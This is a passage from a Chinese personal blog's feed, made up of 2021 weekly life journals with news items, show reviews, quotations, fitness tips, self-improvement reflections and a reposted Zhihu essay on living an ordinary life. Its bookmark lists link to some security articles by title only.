class="headerlink" title="剧集"></a>剧集</h2><ol><li><strong>洛基 1-6</strong></li></ol><p>感觉美剧版洛基有点搞笑<br>神圣时间线，TVA，多元宇宙，yysy，美国的特效做的真不错。</p><ol start="2"><li><strong>2008 年北京奥运会开幕会</strong></li></ol><p>重看了 2008 年的北京奥运会开幕式，真的 10 年后看，仍然震撼。史上最好，美轮美奂，东方大国，我难以用语言形容这场宏大的奥运开幕式，只能说它，无可挑剔。从 56 个民族的小朋友托举着五星红旗交给仪仗队，再到红旗冉冉升起，祝福我们亲爱的祖国，从今走向繁荣富强。<br>中国的宏大，包容，和谐，历史悠长被每一个节目表现得淋漓尽致。<br>中国红，永远是世界上最耀眼的那抹颜色。<br>当我回念往昔，会永远记得 08 年那个夏天，北京奥运会给我们的感动和力量。<br>试看未来的寰宇，必将是赤旗的世界！</p><ol start="3"><li><strong>魔女宅急便</strong></li></ol><p>这是一部宫崎骏的电影，这么多年我还只看过千与千寻和龙猫，所以现在准备补一下（其实是看到某人的头像于是想看一看的）<br>小魔女的成长历程，画风很温馨，城市生活很真实。这一路上她经历了许多历练，暴雨、闯祸、住不了旅馆、不受人待见、送货出错、失去魔法、听不懂黑猫说话等等，但是琪琪没有退缩，还用一颗美好的善良的心去对待身边的所有人，她从这些经历中获得成长，也给我们启迪：“<strong>所有的成长，都是用未经世事的纯真作为代价</strong>。”<br>琪琪是一个独立的小魔女，整部片子传达出的价值观十分适合让小孩子观看。<br>（琪琪去的那座城市，除了风格是欧式的，其他的元素像是红瓦绿树、碧海蓝天，简直就是青岛好嘛 2333）<br>​</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><h3 id="变的更好的标志"><a href="#变的更好的标志" class="headerlink" title="变的更好的标志"></a>变的更好的标志</h3><ol><li><strong>重视自己的健康和快乐</strong></li></ol><p>认真锻炼，坚持体检。每天坚持做一些运动，不断增强自己的免疫力。明白熬夜的坏处，开启规律的作息，不再放纵自己，早早进入甜甜的梦乡。</p><ol start="2"><li><strong>做事积极且自律</strong></li></ol><p>不要被懒惰控制，不要再荒废时光，去钻研有意思的领域，不断提升自己的实力和才华。读书、考证，练书法、学口语，你感兴趣的技能，都可以去尝试。</p><ol start="3"><li><strong>保持干净的气质</strong></li></ol><p>把家里打扫得干干净净、收拾得井井有条，自会福气满满。<br>每周末的时候进行一次大扫除，洗洗床单、换换被罩、晒晒被子。</p><ol start="4"><li><strong>拥有治愈自己的能力</strong></li></ol><p>沮丧低落的时候，能够与自己和解。太累了，记得和自己说一句辛苦了，送自己一点惊喜，告诉自己，坚持下去，你会遇见更多奇妙的景色。</p><ol start="5"><li><strong>懂得控制自己的情绪</strong></li></ol><p>遇到工作难题，既然开心与否都要去做，不如开开心心想办法解决。不传播负面情绪，更不要喋喋不休地抱怨，放宽心，保持乐观。<br>对待家人，更要有个好脾气，不要随意发火，别说伤感情的话，少一点职责，多一点将心比心。</p><ol start="6"><li><strong>心里始终装着善良和温柔</strong></li></ol><p>人活一辈子，要对得起自己的良心，扛起自己的责任，有一份光发一份光，有一份热发一份热。<br>正所谓“爱出者爱返，福往者福来”，怀揣着善意、始终向着光明的你，一定会有更多好运气。</p><h3 id="摆脱油腻"><a href="#摆脱油腻" class="headerlink" title="摆脱油腻"></a>摆脱油腻</h3><p>中年以后，让人变得油腻的，不仅仅是发福的身材和复杂的圈子，更是思想上的贫瘠和学习上的自我放纵。<br>古训有言“人不学，则尘俗生其间，照镜面目可憎，对人语言无味。”<br>再老的人，只要保持着运动、学习的习惯，不那么爱刷存在感，节制干净，都不会有油腻的感觉。<br>​</p><h3 id="走向成熟"><a href="#走向成熟" class="headerlink" title="走向成熟"></a>走向成熟</h3><p>“九牛一毫莫自夸，骄傲自满必翻车”<br>一个人只有放低自己的位置，才能认识到自己的不足，进一步精进自己。<br>技艺的真正秘诀，是要永远当一个初学者。<br>放低自己的位置，不是自卑，不是怯懦，而是一个走向成熟的标志。</p><h3 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h3><ol><li>我曾将青春还给了她，连同指尖弹出的盛夏。</li><li>不要担心老之将至，你老了也一定很可爱。</li><li>“我太文化沙漠了”“没关系，沙漠里也有红柳、胡桃”</li><li>谢谢你的突然出现给我的生活带来了一段特别有意义的日子，祝你平安。</li><li><strong>我本身就是一个不喜欢主动的人，虽然灵魂有趣，但不爱表达。死倔，也慢热，遇到懂我的人是幸运，遇不到也是正常。沉默、喜欢独处、三观正，比你想象的深情，也比你认为的冷漠。</strong></li><li>不要叫我单身狗，我是闪电干饭狼，别拿青春倒插秧，爱情哪有干饭香。</li><li>“请在合适的位置掉头”</li><li>祝你们信念生根，但灵魂自在，往后人生道路宽广，途径的每一个夏天，都草木葱茏，满目生机。</li><li>生活再糟，也不妨碍你越来越好。</li><li>人生三大错觉，一定一定不要自我感觉良好，一定不要高估别人对你的评价，一定一定不要自取其辱！</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>复习了一些</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><h3 id="自律-意志力"><a href="#自律-意志力" class="headerlink" title="自律|意志力"></a>自律|意志力</h3><ol><li><strong>自律就是每天 11 点半准时睡觉，六点 45 准时起床，每天按时去健身，每顿饭不碰手机专心吃饭，控制住自己的欲望，把精力投入到可以提升你的未来的事情当中。</strong></li><li>真正有价值的事情都不是轻松舒服就能完成的，那些晨间的寂静，不眠的星光，清醒的克制，孤军奋战的坚持，才是我们意志闪光的时刻。</li><li>单调的攀登动作会感到厌烦，但每一步都更接近顶峰。</li><li>训练意志力：1.<strong>把事情贯彻到底</strong>。属于自我认知–完成胜过完美。2. <strong>不管花多少时间，把事情做好</strong>。属于自我改善–学习钻研和反省总结。3.<strong>做的比你能做的更好</strong>。属于自我超越–在细节上，每天努力一点点。</li></ol><h3 id="做人"><a href="#做人" class="headerlink" title="做人"></a>做人</h3><ol><li>如果你是个过来人，请不要给正在进行的人泼冷水，即使你在这件事上有发言权，也不要觉得他们做的都是小菜一碟。只要一个人在用心地认真地做一件事，不管这件事在你看来多渺小多轻而易举，都值得真心去鼓励。</li><li>温柔不是懦弱，温柔是一种巨人的力量。一个温柔的人，他不轻易发脾气，不容易失望，他愿意友好对待每一个人。即使他的知识层面和储备都远高于你，仍愿意俯下身来听你说生活的琐碎。他们明亮而不刺眼，自信满满又懂得收敛。</li><li>“你太厉害了，连这个都知道。”“我只是比你早一点知道而已，现在你不也知道了。”</li><li>真正的情商高不是圆滑客套，而是温暖真诚，懂得换位思考，让人如沐春风百处不厌。</li><li>我不知道未来我会遇到什么样的人，但我可以肯定的是，无论以后我遇到什么人，她都同样渴望着我优秀。所以我不需要浪费大量时间去回忆过去和幻想未来。我需要的是把所有的时间用来完善自己。只为了遇见你，然后对你说“我知道你很好，但我也不差。”</li><li>三观是用来约束自己而不是用来审视别人的，道德同理。礼义廉耻，可以律己，不可以绳人。</li><li><strong>保持自己的思想和态度的整洁，让生活事事条理清楚且远离拖沓</strong>。</li><li>“及时止损”辞去不合适的工作，退出不合群的圈子，告别不合适的感情，离开不合适的人，<strong>不要过度怀念沉没成本</strong>。</li><li>大家都是有骨气的人，互相讨厌也没关系。</li><li>遇贵人先立业，遇良人先成家，无贵人而自立，无良人而自修，<strong>无能遇贵人无用，无钱遇良人无缘。</strong></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627384883746-629e4f30-a0a9-4ff6-91a3-47759ee51d54.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1db02c38&margin=%5Bobject%20Object%5D&name=1627384861858.jpg&originHeight=1135&originWidth=1046&originalType=binary%E2%88%B6=1&size=277784&status=done&style=none&taskId=u80897df3-34ae-4332-9203-ea1eac25005" alt="1627384861858.jpg"></p><h4 id="不要说"><a href="#不要说" class="headerlink" title="不要说"></a>不要说</h4><ol><li>批评别人喜欢的东西，并不会让别人讨厌这个东西，只会让人讨厌你。</li><li>“这都不知道？”“这都没见过？”“这都没听过？”“不是吧？”</li></ol><h3 id="学习-读书"><a href="#学习-读书" class="headerlink" title="学习|读书"></a>学习|读书</h3><ol><li>读书不光是为了学习知识，更重要的是，学会思考，学会考虑事情之间的逻辑。</li><li>走出去，去经历更大的世界，去不断遇到自己的极限，然后去尝试突破它，突破再突破，当有一天回过头来看的时候，自己已经走出了从未想象想过的前途。</li><li>你可以假装不行，但你不能真不行。</li></ol><h3 id="人生的意义"><a href="#人生的意义" class="headerlink" title="人生的意义"></a>人生的意义</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627384928389-373bdc92-3d31-407a-9063-ac505f0a81f5.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u7f9f5733&margin=%5Bobject%20Object%5D&name=1627384921569.jpg&originHeight=778&originWidth=800&originalType=binary%E2%88%B6=1&size=103876&status=done&style=none&taskId=u60ae5f96-ff82-4e08-83c7-3285d4e3487" alt="1627384921569.jpg"><br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627386526412-11cf2990-dc26-4df1-83f4-8a5f88a0c17e.jpeg#clientId=u1f8968b0-1af6-4&from=drop&id=u1c1eac39&margin=%5Bobject%20Object%5D&name=1627386350439.jpg&originHeight=1494&originWidth=1080&originalType=binary%E2%88%B6=1&size=399177&status=done&style=none&taskId=u576adb8e-d4fa-4594-9415-4a7800524bb" alt="1627386350439.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1627386710065-f3322d0b-a1d3-406e-89be-8ff617183df4.jpeg#clientId=u1f8968b0-1af6</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>生活周报-July-14-to-21</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-July-14-to-21/</id>
    <published>2021-07-21T11:33:09.000Z</published>
    <updated>2022-02-07T10:05:53.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>吴亦凡被锤，让子弹飞一会。</li><li>河南遇千年一遇大雨，平均降水量超 200 毫米，郑州受灾严重，铁路全部停运。风雨中，我们守望相助，希望前方人民平安！也感谢所有在天灾前伸出援手的人，你们都是英雄，希望你们都能平安归来！</li><li>东京奥运会即将开幕，日本无力吐槽，整活一套一套的。</li><li>世界最快磁悬浮在青岛试车成功。</li><li>南京机场爆发疫情，南大夏令营改为线上。</li><li>河南卷烟厂也上热搜了</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>又来上海了，希望如愿以偿！</li><li>上海物价真的高，风比青岛还大，云也超大</li><li>下雨天不要骑共享单车！</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>深度包检测技术介绍_吃素的小动物的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_30654419/article/details/96930279">https://blog.csdn.net/weixin_30654419/article/details/96930279</a></li><li>机器学习在网络流量分类中的应用_dieTicket 的博客-CSDN 博客<a href="https://blog.csdn.net/dieTicket/article/details/106869766">https://blog.csdn.net/dieTicket/article/details/106869766</a></li><li>HTTPS 到底有多复杂，能防止重放攻击吗？ - 知乎<a href="https://zhuanlan.zhihu.com/p/360782536">https://zhuanlan.zhihu.com/p/360782536</a></li><li>P2P 网络及节点发现机制_qukuai 的博客-CSDN 博客_p2p 节点<a href="https://blog.csdn.net/qukuai/article/details/81082421">https://blog.csdn.net/qukuai/article/details/81082421</a></li><li>b+树时间复杂度_leetCode. 二叉搜索树专题(4)_weixin_39598941 的博客-CSDN 博客<a href="https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1">https://blog.csdn.net/weixin_39598941/article/details/110570255?utm_medium=distribute.wap_relevant.none-task-blog-baidujs_baidulandingword-1</a></li><li><a href="https://mp.weixin.qq.com/s/Gb9SW0Sl63xbQ21pSY_JOg">老生常谈的无字母数字 Webshell 总结</a></li><li><a href="https://mp.weixin.qq.com/s/SWCj9CXOWbkny0A35Lagow">恶意代码流量分析与监测</a></li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？<br>-_-哪有时间</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>来自《觉醒时代》</li></ol><p>我们中国人，思想、性格，有很多的弱点，<br>但是，在我们中国人身上，有其他任何民族都没有的、难以言喻的东西，<br>那就是温良。<br>温良，不是温顺，更不是懦弱，<br>温良是一种力量，是一种同情和人类智慧的力量。<br>大灾面前，更显真情。振臂一呼，无数援手。<br>河南挺住！国家和人民都在你们的身后！</p><ol start="2"><li>来自《千与千寻》</li></ol><p>不管前方的路有多苦，只要走的方向正确，都比站在原地更接近幸福。</p><ol start="3"><li>最清晰的脚印，踩在最泥泞的路上。</li><li>无论风暴将我带到什么岸边，我都将以主人的身份上岸。</li><li>自律且努力，别让生活太安逸。</li><li>不要因为走得太快，而忘记为什么出发。–纪伯伦</li><li>满怀希望就会所向披靡。</li><li>不做准备，就是在准备失败。–富兰克林</li><li>生活，就是昂首前瞻。</li><li>感恩努力每个追寻的瞬间，我们找到彼此也和自己相认。</li></ol><p>​</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>pitch–好看简洁的在线 ppt 制作网站</li><li><a href="https://www.cnblogs.com/llfy/p/9405120.html">堆和栈的区别</a></li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>无论人生上到哪一层台阶，阶下有人在仰望你，阶上亦有人在俯视你。你抬头自卑，低头自得，唯有平视，才能看见真正的自己。</li><li>愿你的未来纯净明朗，像你此刻可爱的目光。在世间美好的命运中，愿你的命运美好欢畅。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;吴亦凡被锤，让子弹飞一会。&lt;/li&gt;
&lt;li&gt;河南遇千年一遇大雨，平均降水量超 200 毫米，郑州受灾严重，铁路全部停运。风雨中</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>一个平凡人的自述</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E4%B8%80%E4%B8%AA%E5%B9%B3%E5%87%A1%E4%BA%BA%E7%9A%84%E8%87%AA%E8%BF%B0/</id>
    <published>2021-07-11T03:15:57.000Z</published>
    <updated>2022-02-07T10:05:53.632Z</updated>
    
    <content type="html"><![CDATA[<p><strong>一个平凡人，活着的意义是什么呢？</strong></p><p>我没有很好的外表，也没有可以挥霍的资本，从小到大一直都普普通通。<br>​</p><p>在人前一般都很安静，给人看起来不善言谈的样子。个人很独立，自己的事情尽量自己完成。从不主动去和异性搭话或是帮忙，也很少去表现自己，在人群中永远都是小透明。<br>​</p><p>消息总是群聊、公众号发来的信息，时常觉得是自己做的不够好，长得不好看。内心很敏感，有时别人一句无心的话，可能会使自己郁闷一整天。<br>​</p><p>和别人说话总是很温柔，难过的事情自己扛，不太希望别人干扰我的生活，听歌听一晚、睡起来还是新的一天。在灯火通明的夜里，无聊的看星星和月亮落下，每天都是循环如此。<br>​</p><p>每当有人问起，为什么我不恋爱的时候，我总以麻烦为理由搪塞过去。<br>​</p><p>朋友和我说，或许是你还没遇见真正喜欢的人吧，我却没法开口告诉他们。其实我遇见过，只是遇见得过早，以至于我还没来得及弄清楚，就弄丢了。<br>​</p><p>在二十多年的平淡日子里，既没能成为自己的月亮，又一事无成，惊艳不了谁的岁月。<br>​</p><p>那么平凡的我，活着的意义是什么？<br>​</p><p>日你妈，我偏爱自己骨子里的那份冷清，生性安静，但也孤傲，遵从自己的内心。<br>​</p><p>我脚下的影子从来不肯试着像谁，直抒胸臆我也不曾受谁气受。<br>​</p><p><strong>我对美好生活的向往，就是我活着的意义。</strong><br>​</p><p>我想努努力，赚点小钱，然后实现经济独立，去做些自己想做的事。</p><p>去爬一次雪山，去感受千山鸟飞绝，万径人踪灭。去感受自然的伟大和雄伟瑰丽，去挑战自我。<br>​</p><p>去草原骑一次大马，看野花被风吹起，牛羊奔息，草原就像是落了一场急雨。草叶翻滚，踩上去就会有咯吱咯吱的淅沥与轻柔。<br>​</p><p>去边远的乡村旅行。傍晚的风很轻，天空挂着洁白的云，在小镇古朴的石桥上，牵着大狗儿慢悠悠地走在落日的大道。<br>​</p><p>我还想去写故乡的月亮，弥补对家人的亏欠，为自己不懂事的过往道歉，原谅自己人生的缺憾。<br>​</p><p>那时的天空很蓝很近，晚霞晕染在天边，村庄散出一圈又一圈的白烟。我和女孩站在长满栗子的老树下，轻轻地敲打着秋天。<br>​</p><p>我现在想去遇见能分享心情的人。看月光淡淡地爬上树梢，抓住平淡日子里的小确幸，在心里种下一株向阳而生的花儿，比一切美酒都要芬芳。<br>​</p><p>有人问一个平庸的人，活着的意义是什么？其实无论多么波澜壮阔的生命，最终都要归于平淡的柴米油盐与尘土，我感谢自己卑微而鲜活地活着。<br>​</p><p>有人说活着很累，其实吧，我也没吃过什么生活的苦。此生有幸，受家人疼爱，朋友照顾，而我不快乐的原因多数只是自己放大了，一些人生中的小挫折失败罢了。<br>​</p><p>生活中总会有很多平常的快乐可以沉溺其中。比如每天吃到的好吃东西，与朋友分享的有趣片段；洗完了积攒许久的衣服，收获来自陌生人的夸赞与关心；在温柔的日落下，去小区楼下喂养流浪的小猫，任其在怀里撒泼打滚。<br>​</p><p>生活本就由零散的碎片组成，有时鸡飞狗跳，有时轻松欢愉。如果愿意用最细腻的情感，去体验那些包裹在烟火里的平凡琐碎，就会从中收获到新的柔软与感动。如果感到不快乐的时候，可能只是我们把重心放错了地方，不必在一件事上停留太久。<br>​</p><p><strong>生活原本苦闷，但跑起来就会生风。</strong><br><strong>​</strong></p><blockquote><p>这是知乎答主<a href="https://www.zhihu.com/people/you-nei-han-de-shi-ni-yao-a">吹面不寒</a>的一篇回答，我很喜欢，这世界有很多相似的人，虽然成长的环境各不相同，但却塑造成了相似的人，我从他的回答里看到了自己的影子，可以说世另我！<br>所以说，像我们这样平凡的人，既然并不出色，那么就把手里的事情做好，就够了。既然成为不了别人的月亮，也温柔不了别人的时光，那么就好好的爱自己，好好的爱家人，对朋友也真心付出，好好的健身，去提升自己，无论内在或者外在。<br>追逐日月，不苟于山川。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;一个平凡人，活着的意义是什么呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我没有很好的外表，也没有可以挥霍的资本，从小到大一直都普普通通。&lt;br&gt;​&lt;/p&gt;
&lt;p&gt;在人前一般都很安静，给人看起来不善言谈的样子。个人很独立，自己的事情尽量自己完成。从不主动去和异性搭话</summary>
      
    
    
    
    <category term="随笔" scheme="https://www.blog.hackerjerry.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="知乎" scheme="https://www.blog.hackerjerry.top/tags/%E7%9F%A5%E4%B9%8E/"/>
    
  </entry>
  
  <entry>
    <title>生活周报-June-28-to-July-4</title>
    <link href="https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4/"/>
    <id>https://www.blog.hackerjerry.top/2021/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5-June-28-to-July-4/</id>
    <published>2021-07-02T11:07:48.000Z</published>
    <updated>2022-02-07T10:05:53.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>7 月 1 日，中国共产党百年华诞。</li><li>中国男足进入世界杯亚洲 12 强</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>期末考试结束。</li><li>暑期复习开始。</li><li>西安大雨，又一次落汤鸡。</li><li>西交的优营没拿到，入 66 就给了 15 个，真醉了。</li><li>开始早起健身，不碰手机，杜绝流视频平台（包括 b 站，好友热播等），不看 qq 动态。</li><li>开始 12 点之前上床，上床前定好闹钟，上床不看手机。</li><li>​</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>【1】：<a href="https://mp.weixin.qq.com/s/Ic70dj7FSmDHGKTsekjhGQ">Kerberos 协议相关安全问题分析与利用</a><br>【2】：<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==%E2%88%A3=2247497760&idx=1&sn=4c0f57ba9203cc115a85cd0c011fdc43&chksm=ec1cad1fdb6b2409ec3ef25008ad6834a7220997a914308a478ed9d682c84c7b370e423a878c&scene=21#wechat_redirect">Kerberos 协议与 Kerberos 认证原理</a><br>【3】：<a href="https://mp.weixin.qq.com/s/_aeUWSfK4Igi_dAAJlvEww">隐秘的印记：暗水印实践技术分享</a><br>【4】：<a href="https://mp.weixin.qq.com/s/aIIP4qjtkGd1Houaq0cpdw">使用 Caronte 在 CTF 比赛中完成网络流量分析</a><br>《自控力》–节省决策成本</p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><p>追了哪些剧？</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>你若在场，看着繁华盛世，多好。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625225843972-38a5b8da-9529-44b6-8f0d-9090e106dc3c.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=347&id=u8745ea97&margin=%5Bobject%20Object%5D&name=1625225828093.jpg&originHeight=1080&originWidth=2400&originalType=binary%E2%88%B6=1&size=327540&status=done&style=none&taskId=uba156795-0383-4e11-9261-6891a96e69a&width=772" alt="1625225828093.jpg"></p><ol start="2"><li>万事藏于心而不表于情，花开两朵，天各一方，追赶日月，不苟于山川。</li><li>世态人情，可当书读，可当戏看，有缘无份，好聚好散。</li><li><strong>今天我请客，请你快乐</strong>。</li><li>那些你做了所有努力也没有在一起的人，都不是对的人。</li><li>道德是用来律己的，不是用来责人的。道德是用来躬行实践的，不是在嘴里头空喊的。–李大钊</li><li>我知道月光不会为我停留，也知道夏风永远短暂，可我仍会为那零星光亮奋力奔跑。</li><li>如今的社会风气啊，越来越苟且敷衍，只顾眼前，道德伦丧、败坏德行的事情，触目皆是，不是德行根基牢固的人，少有不被这种社会风气所污染。各位，国家的兴衰，要看社会风气是高尚还是低劣，如果都流行于这种社会风气，前途不堪设想，所以要有卓越之人，以身作则，尽力去矫正这种颓废的社会风气。<strong>诸君皆为大学学生，地位甚高，肩此重任，责无旁贷。如果德不修、学不讲，还与这种颓废的社会风气同流合污，那亦是侮辱自己，更何谈，做他人的榜样呢</strong>？所以，<strong>品行不可以不严谨对待和修养</strong>，这是我希望于诸君者之二。——蔡元培</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h3 id="健身"><a href="#健身" class="headerlink" title="健身"></a>健身</h3><blockquote><p>来自过来人的建议–从 125 斤到 165 斤</p></blockquote><ol><li>坚持，做任何事情都要坚持，健身也不例外。</li><li>一定要学好基础动作。</li><li>统计数据。吃了多少蛋白质，训练动作做了多重次数多少，肌肉酸疼感觉。</li><li>休息一定要安排好。</li><li>训练复盘<blockquote><p>关于饮食</p></blockquote></li></ol><p>碳水：蛋白质：油脂=6：3：1<br>一周三到四练，以三大项为主，先练大肌肉群，用大重量。肩和手臂用小重量多次，保证动作质量。（每天 30 分钟左右）<br>什么样的碳水呢？<br>米饭、玉米、土豆、馒头、面包等</p><blockquote><p>越跑肉掉的越多，有氧运动消耗太大。</p></blockquote><h3 id="摄影"><a href="#摄影" class="headerlink" title="摄影"></a>摄影</h3><p>新关注了一个 up 主，用的索尼 6400，配的适马 2000</p><h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625226582197-9c281881-354e-4d97-85a1-dbd18db250eb.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=960&id=u2ba33ffe&margin=%5Bobject%20Object%5D&name=1625226567307.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=516869&status=done&style=none&taskId=u4ec4a1b9-ac12-467c-b283-d5d7f5e5c1b&width=432" alt="1625226567307.jpg"></p><ol><li>练就有神眼睛</li><li>如何以尽可能低的价钱买东西？</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625226746402-1871a076-a44d-4b4d-bd7c-3c238dae65fe.jpeg#clientId=ue0601b88-cb5c-4&from=drop&height=1089&id=u821bc7fd&margin=%5Bobject%20Object%5D&name=1625226731433.jpg&originHeight=2400&originWidth=1080&originalType=binary%E2%88%B6=1&size=544277&status=done&style=none&taskId=u7cb492fc-4d99-4228-a464-fefb2b8c445&width=490" alt="1625226731433.jpg"></p><ol start="3"><li>填什么东西，申请表之类的，交上之前拍照或者复制一份在手里，以备不时之需。</li><li>学会说话</li></ol><p>把“谢谢”改成“<strong>谢谢你</strong>”<br>把“随便”改成“<strong>听你的</strong>”<br>把“听明白了吗”改成“<strong>我说明白了吗</strong>”<br>把“我尽量”改成“<strong>我全力以赴</strong>”</p><ol start="5"><li><strong>最困难的事情，在早晨完成，不要第一时间看手机！</strong></li><li>如何养成良好的坐姿</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>关于为何没有拿到西交的优秀营员，我回想了一下，应该是回答踩雷太多了。</li><li>酒后吐真言未必是真的，只是他想让你这么相信罢了，具体还是要看他干了什么事。</li><li>你付出信任，就会收获信任；你给出赞美，就会收获支持。生命，是一种回声。</li><li>关于认清自己，学姐是这么说的：<strong>静下心来，整理自己所获得的成就，回顾自己以往的失败案例，去对比，去排除。</strong></li></ol><p><strong>​</strong></p><p><strong>我们始终在认识自己的道路上前进，这条路不太好走，迷雾很多，干扰也有很多，稍不留神，我们就迷失了。</strong><br><strong>​</strong></p><p><strong>但是我们应该做的，就是要认清自己想要什么，自己正在干什么，自己还有哪些不足要去弥补，就够了。人无完人，不必陷入对他人的焦虑之中，面对自己，每天进步，无愧于心就好。</strong></p><ol start="5"><li>关于做学问和读书，觉醒年代中是这么说的：</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625232507776-150516a4-1a61-4c24-8859-29e6db67f4a6.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=u94f210ad&margin=%5Bobject%20Object%5D&name=N7536JW%29%404DFBR5S7M92%7BOA.jpg&originHeight=965&originWidth=720&originalType=binary%E2%88%B6=1&size=102821&status=done&style=none&taskId=uc64ab375-fe33-44cb-af56-dc3efbdbce1" alt="N7536JW)@4DFBR5S7M92{OA.jpg"><br>​</p><p>百年前，北大学子中是这样对待学问的，“平时冶游，考试来了，才去翻读讲义”“不问学术之有无，唯争分数之多寡，考试结束，书籍束之高阁，毫不过问。”如今的我们，似乎并无二致。平日上课，草草应付，课前预习、课后复习的好习惯早已抛掷脑后，临了考试，靠老师的重点过活，力求高分，卷绩点，却没有将知识的深度延伸，考完再不过问，何谈科教兴邦，何谈科教兴国，培养出一群只会考试的人，如何学以致用，弥补差距？</p><ol start="6"><li>来自教员年轻的时候说的话：<strong>这是一个浮躁的社会，只有自律的人，才有可能脱颖而出，成就大事。</strong></li></ol><p>教员在天之灵，看到这锦绣山河，想必也会欣慰的。<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/1629942/1625225906498-c937a154-1381-4161-bc87-398be24c43d6.jpeg#clientId=ue0601b88-cb5c-4&from=drop&id=uda969225&margin=%5Bobject%20Object%5D&name=1625225893756.jpg&originHeight=1079&originWidth=720&originalType=binary%E2%88%B6=1&size=73415&status=done&style=none&taskId=u72567956-30d5-4e5b-9f3e-4ffe4896e22" 